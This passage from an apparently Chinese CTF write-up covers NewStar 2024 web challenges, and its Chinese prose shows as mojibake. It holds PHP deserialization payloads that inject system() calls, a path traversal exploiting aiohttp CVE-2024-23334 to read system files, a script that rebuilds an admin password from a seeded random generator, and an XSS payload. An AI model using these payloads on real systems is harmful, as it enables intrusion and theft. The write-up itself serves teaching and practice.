</span></span><span style=display:flex><span>$expp <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>let_me</span>;
</span></span><span style=display:flex><span>$expp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>let_me</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>system(</span><span style=color:#ae81ff>\$</span><span style=color:#e6db74>_GET[1]);&#34;</span>;
</span></span><span style=display:flex><span>$expp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>time</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>study</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>sign_in</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>ctf</span><span style=color:#f92672>=</span><span style=color:#66d9ef>array</span>($expp,<span style=color:#e6db74>&#39;get_flag&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>serialize</span>($exp);
</span></span></code></pre></div><p>æœ€åè‚¯å®šæ˜¯éœ€è¦è¿›åˆ°<code>getflag()</code>å†™æ–‡ä»¶è¿›å»æ‰§è¡Œrce,æœ€åçš„ä»£ç é‡Œç”±äºæœ‰<code>.</code>å¯ä»¥è¢«å½“æˆè¯­å¥è§¦å‘è°ƒç”¨<code>__tostring()</code>,ç„¶ååˆ©ç”¨æ•°ç»„è°ƒç”¨<code>($this->ctf)(1);</code>è¿™é‡Œæœ‰æ¢è¡Œæ˜¯ä¸ºäº†è¿‡æ»¤å‰é¢çš„å†…å®¹ï¼Œæå‰é—­åˆã€‚è‡³äºè°ƒç”¨studyæˆ‘ä¸å¤ªæ˜ç™½ï¼Œé—®çš„aiè¯´çš„æ˜¯ä¿æŒé“¾çš„ç”Ÿå‘½å‘¨æœŸã€‚</p><p>åŸç†æ˜¯åœ¨unlinkä¹‹å‰è§¦å‘catchå¼‚å¸¸é˜²æ­¢åˆ æ‰<code>code.php</code>,æ‡‚åšä¸»åœ¨è¯´ä»€ä¹ˆå®æ“ä¸æ€ä¹ˆé¡ºåˆ©ã€‚</p><p>å­¦ä¸€ä¸‹å®˜pçš„æ€è·¯</p><p>å®˜pçš„å…³é”®ç‚¹æ˜¯<code> ($this->ctf)(1);</code>è¿™é‡Œçš„ctfå¯ä»¥èµ‹å€¼ä¸ºsleepï¼Œè¿™æ ·å¯ä»¥å…ˆæ‰§è¡Œç¡çœ 1så†åˆ é™¤æ–‡ä»¶</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$payload  <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>happy</span>();
</span></span><span style=display:flex><span>$payload <span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>sign_in</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ctf</span>();
</span></span><span style=display:flex><span>$exp <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>let_me</span>();
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>let_me</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;?&gt; &lt;?php system(&#39;cat /flag&#39;);&#34;</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>time</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ctf</span>();
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>time</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>ctf</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sleep&#34;</span>;
</span></span><span style=display:flex><span>$payload <span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>sign_in</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>ctf</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>($exp,<span style=color:#e6db74>&#34;get_flag&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>serialize</span>($payload));
</span></span></code></pre></div><p>ç”±äºç±»ä¼¼äºæ¡ä»¶ç«äº‰ï¼Œæ‰€ä»¥éœ€è¦æ‰‹é€Ÿå¿«ä¸€ç‚¹æˆ–è€…ç”¨è„šæœ¬ã€‚</p><h3 id=è‡­çš®çš„ç½‘ç«™å¤ç°>è‡­çš®çš„ç½‘ç«™(å¤ç°)</h3><p>æºç ç»™äº†æç¤º</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>YWlvaHR0cD8gbmdpbng/IHJlYWRmaWxlPw==
</span></span><span style=display:flex><span>aiohttp? nginx? readfile?
</span></span></code></pre></div><p>ç½‘ç«™æ˜¯ aiohttp æ¡†æ¶ï¼Œè€ƒå¯Ÿçš„æ˜¯<code>CVE-2024-23334</code></p><p><img alt=57 loading=lazy src=/posts/ctf/newstar2024/57.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>HTTP<span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Server: nginx<span style=color:#f92672>/</span><span style=color:#ae81ff>114.5.14</span>
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Type: text<span style=color:#f92672>/</span>x<span style=color:#f92672>-</span>python
</span></span><span style=display:flex><span>Etag: <span style=color:#e6db74>&#34;17f68b1f9ac4ce00-fe6&#34;</span>
</span></span><span style=display:flex><span>Last<span style=color:#f92672>-</span>Modified: Thu, <span style=color:#ae81ff>19</span> Sep <span style=color:#ae81ff>2024</span> <span style=color:#ae81ff>04</span>:<span style=color:#ae81ff>34</span>:<span style=color:#ae81ff>35</span> GMT
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Length: <span style=color:#ae81ff>4070</span>
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>-</span>Ranges: bytes
</span></span><span style=display:flex><span>Date: Sun, <span style=color:#ae81ff>10</span> Nov <span style=color:#ae81ff>2024</span> <span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>10</span>:<span style=color:#ae81ff>38</span> GMT
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> subprocess
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> aiohttp <span style=color:#f92672>import</span> web
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> aiohttp_session <span style=color:#f92672>import</span> setup <span style=color:#66d9ef>as</span> session_setup, get_session
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> aiohttp_session.cookie_storage <span style=color:#f92672>import</span> EncryptedCookieStorage
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> uuid
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> secrets
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>random<span style=color:#f92672>.</span>seed(uuid<span style=color:#f92672>.</span>getnode())
</span></span><span style=display:flex><span><span style=color:#75715e># pip install -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp_session cryptography</span>
</span></span><span style=display:flex><span><span style=color:#75715e># pip install -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp==3.9.1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>adminname <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>CreteKey</span>():
</span></span><span style=display:flex><span>    key_bytes <span style=color:#f92672>=</span> secrets<span style=color:#f92672>.</span>token_bytes(<span style=color:#ae81ff>32</span>)
</span></span><span style=display:flex><span>    key_str <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>urlsafe_b64encode(key_bytes)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> key_str
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>authenticate</span>(username, password):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> username <span style=color:#f92672>==</span> adminname <span style=color:#f92672>and</span> password <span style=color:#f92672>==</span><span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(random<span style=color:#f92672>.</span>choices(string<span style=color:#f92672>.</span>ascii_letters <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits, k<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>)):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>middleware</span>(app, handler):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>middleware_handler</span>(request):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> handler(request)
</span></span><span style=display:flex><span>            response<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;Server&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;nginx/114.5.14&#39;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> response
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> web<span style=color:#f92672>.</span>HTTPNotFound:
</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> handler_404(request)
</span></span><span style=display:flex><span>            response<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;Server&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;nginx/114.5.14&#39;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> response
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span>:
</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> handler_500(request)
</span></span><span style=display:flex><span>            response<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;Server&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;nginx/114.5.14&#39;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> response
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> middleware_handler
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>handler_404</span>(request):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> web<span style=color:#f92672>.</span>FileResponse(<span style=color:#e6db74>&#39;./template/404.html&#39;</span>, status<span style=color:#f92672>=</span><span style=color:#ae81ff>404</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>handler_500</span>(request):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> web<span style=color:#f92672>.</span>FileResponse(<span style=color:#e6db74>&#39;./template/500.html&#39;</span>, status<span style=color:#f92672>=</span><span style=color:#ae81ff>500</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>(request):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> web<span style=color:#f92672>.</span>FileResponse(<span style=color:#e6db74>&#39;./template/index.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>(request):
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> request<span style=color:#f92672>.</span>post()
</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> data[<span style=color:#e6db74>&#39;username&#39;</span>]
</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> data[<span style=color:#e6db74>&#39;password&#39;</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> authenticate(username, password):
</span></span><span style=display:flex><span>        session <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> get_session(request)
</span></span><span style=display:flex><span>        session[<span style=color:#e6db74>&#39;user&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;admin&#39;</span>
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> web<span style=color:#f92672>.</span>HTTPFound(<span style=color:#e6db74>&#39;/home&#39;</span>)
</span></span><span style=display:flex><span>        response<span style=color:#f92672>.</span>session <span style=color:#f92672>=</span> session
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> web<span style=color:#f92672>.</span>Response(text<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;è´¦å·æˆ–å¯†ç é”™è¯¯å“¦&#34;</span>, status<span style=color:#f92672>=</span><span style=color:#ae81ff>200</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>home</span>(request):
</span></span><span style=display:flex><span>    session <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> get_session(request)
</span></span><span style=display:flex><span>    user <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;user&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> user <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;admin&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> web<span style=color:#f92672>.</span>FileResponse(<span style=color:#e6db74>&#39;./template/home.html&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> web<span style=color:#f92672>.</span>HTTPFound(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>upload</span>(request):
</span></span><span style=display:flex><span>    session <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> get_session(request)
</span></span><span style=display:flex><span>    user <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;user&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> user <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;admin&#39;</span>:
</span></span><span style=display:flex><span>        reader <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> request<span style=color:#f92672>.</span>multipart()
</span></span><span style=display:flex><span>        file <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> reader<span style=color:#f92672>.</span>next()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> file:
</span></span><span style=display:flex><span>            filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;./static/&#39;</span> <span style=color:#f92672>+</span> file<span style=color:#f92672>.</span>filename
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>with</span> open(filename,<span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>                    chunk <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> file<span style=color:#f92672>.</span>read_chunk()
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> chunk:
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>                    f<span style=color:#f92672>.</span>write(chunk)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> web<span style=color:#f92672>.</span>HTTPFound(<span style=color:#e6db74>&#34;/list&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> web<span style=color:#f92672>.</span>HTTPFound(<span style=color:#e6db74>&#39;/home&#39;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> response
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> web<span style=color:#f92672>.</span>HTTPFound(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ListFile</span>(request):
</span></span><span style=display:flex><span>    session <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> get_session(request)
</span></span><span style=display:flex><span>    user <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;user&#39;</span>)
</span></span><span style=display:flex><span>    command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ls ./static&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> user <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;admin&#39;</span>:
</span></span><span style=display:flex><span>        result <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>run(command, shell<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, check<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, text<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, capture_output<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>        files_list <span style=color:#f92672>=</span> result<span style=color:#f92672>.</span>stdout
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> web<span style=color:#f92672>.</span>Response(text<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;staticç›®å½•ä¸‹å­˜åœ¨æ–‡ä»¶</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>+</span>files_list)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> web<span style=color:#f92672>.</span>HTTPFound(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>init_app</span>():
</span></span><span style=display:flex><span>    app <span style=color:#f92672>=</span> web<span style=color:#f92672>.</span>Application()
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>router<span style=color:#f92672>.</span>add_static(<span style=color:#e6db74>&#39;/static/&#39;</span>, <span style=color:#e6db74>&#39;./static&#39;</span>, follow_symlinks<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>    session_setup(app, EncryptedCookieStorage(secret_key<span style=color:#f92672>=</span>CreteKey()))
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>middlewares<span style=color:#f92672>.</span>append(middleware)
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>router<span style=color:#f92672>.</span>add_route(<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;/&#39;</span>, index)
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>router<span style=color:#f92672>.</span>add_route(<span style=color:#e6db74>&#39;POST&#39;</span>, <span style=color:#e6db74>&#39;/&#39;</span>, login)
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>router<span style=color:#f92672>.</span>add_route(<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;/home&#39;</span>, home)
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>router<span style=color:#f92672>.</span>add_route(<span style=color:#e6db74>&#39;POST&#39;</span>, <span style=color:#e6db74>&#39;/upload&#39;</span>, upload)
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>router<span style=color:#f92672>.</span>add_route(<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;/list&#39;</span>, ListFile)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> app
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>web<span style=color:#f92672>.</span>run_app(init_app(), host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>80</span>)
</span></span></code></pre></div><p>è¿™é‡Œ <code>admin</code> å¯†ç ä½¿ç”¨äº†éšæœºæ•°ï¼Œç„¶è€Œéšæœºæ•°çš„ <code>randseed</code> è®¾ç½®å¦‚ä¸‹ï¼Œ<code>random.seed(uuid.getnode())</code>.</p><p>è¿™é‡Œç§å­æ˜¯å›ºå®šå€¼ï¼Œå³ MAC åœ°å€ï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶è¯»å–è·å–è¿™ä¸ªç§å­ã€‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>/static/../../sys/class/net/eth0/address
</span></span></code></pre></div><p>è¯»å–åˆ°macåœ°å€</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>c6:7a:dd:01:e8:13#c67add01e813
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>random<span style=color:#f92672>.</span>seed(<span style=color:#ae81ff>0xc67add01e813</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(random<span style=color:#f92672>.</span>choices(string<span style=color:#f92672>.</span>ascii_letters <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits, k<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>)))
</span></span><span style=display:flex><span><span style=color:#75715e>#xPcTBtpn</span>
</span></span></code></pre></div><p>å¾—åˆ°å¯†ç å°±å¯ä»¥æ­£å¸¸ç™»å…¥äº†</p><p>å®šä½ä¸€ä¸‹ä¸Šä¼ æ–‡ä»¶çš„ä»£ç ï¼Œç®€å•åˆ†æè¿›è¡Œä»¥ä¸‹æ“ä½œ</p><p><img alt=58 loading=lazy src=/posts/ctf/newstar2024/58.png></p><p><img alt=59 loading=lazy src=/posts/ctf/newstar2024/59.png></p><p>æœ€åç›´æ¥ç”¨å¼€å§‹çš„ç›®å½•ç©¿è¶Šå°±å¯ä»¥å¾—åˆ°flagäº†</p><p><img alt=60 loading=lazy src=/posts/ctf/newstar2024/60.png></p><h3 id=pangbai-è¿‡å®¶å®¶5å¤ç°>PangBai è¿‡å®¶å®¶ï¼ˆ5ï¼‰(å¤ç°)</h3><p>åœ¨<code>bot.ts</code>é‡Œæœ‰å†…å®¹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ts data-lang=ts><span style=display:flex><span><span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>setCookie</span>({
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>name</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;FLAG&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>value</span>: <span style=color:#66d9ef>process.env</span>[<span style=color:#e6db74>&#39;FLAG&#39;</span>] <span style=color:#f92672>||</span> <span style=color:#e6db74>&#39;flag{test_flag}&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>httpOnly</span>: <span style=color:#66d9ef>false</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>path</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;/&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>domain</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;localhost:3000&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>sameSite</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;Strict&#39;</span>
</span></span><span style=display:flex><span>    });
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#960050;background-color:#1e0010>#</span> <span style=color:#a6e22e>onerror</span><span style=color:#f92672>=</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>);<span style=color:#75715e>//
</span></span></span></code></pre></div><p>å¯ä»¥ç»•è¿‡ä½†æ˜¯ä¸å‡ºç½‘</p><p>è·Ÿè¸ªé™„ä»¶ä¸­çš„åç«¯æºç ï¼Œ<code>page.ts</code> ä¸­çš„ <code>/box/:id</code> è·¯ç”±ï¼Œä¼šæ¸²æŸ“æˆ‘ä»¬çš„è¾“å…¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ts data-lang=ts><span style=display:flex><span><span style=color:#a6e22e>router</span>.<span style=color:#66d9ef>get</span>(<span style=color:#e6db74>&#39;/box/:id&#39;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>ctx</span>, <span style=color:#a6e22e>next</span>) <span style=color:#f92672>=&gt;</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>letter</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Memory</span>.<span style=color:#66d9ef>get</span>(<span style=color:#a6e22e>ctx</span>.<span style=color:#a6e22e>params</span>[<span style=color:#e6db74>&#39;id&#39;</span>])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>ctx</span>.<span style=color:#a6e22e>render</span>(<span style=color:#e6db74>&#39;letter&#39;</span>, &lt;<span style=color:#f92672>TmplProps</span>&gt;{
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>page_title</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;PangBai è¿‡å®¶å®¶ (5)&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>sub_title</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;æŸ¥çœ‹ä¿¡ä»¶&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>id</span>: <span style=color:#66d9ef>ctx.params</span>[<span style=color:#e6db74>&#39;id&#39;</span>],
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>hint_text</span>: <span style=color:#66d9ef>HINT_LETTERS</span>[Math.<span style=color:#a6e22e>floor</span>(Math.<span style=color:#a6e22e>random</span>() <span style=color:#f92672>*</span> <span style=color:#a6e22e>HINT_LETTERS</span>.<span style=color:#a6e22e>length</span>)],
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>data</span>: <span style=color:#66d9ef>letter</span> <span style=color:#f92672>?</span> {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>title</span>: <span style=color:#66d9ef>safe_html</span>(<span style=color:#a6e22e>letter</span>.<span style=color:#a6e22e>title</span>),
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>content</span>: <span style=color:#66d9ef>safe_html</span>(<span style=color:#a6e22e>letter</span>.<span style=color:#a6e22e>content</span>)
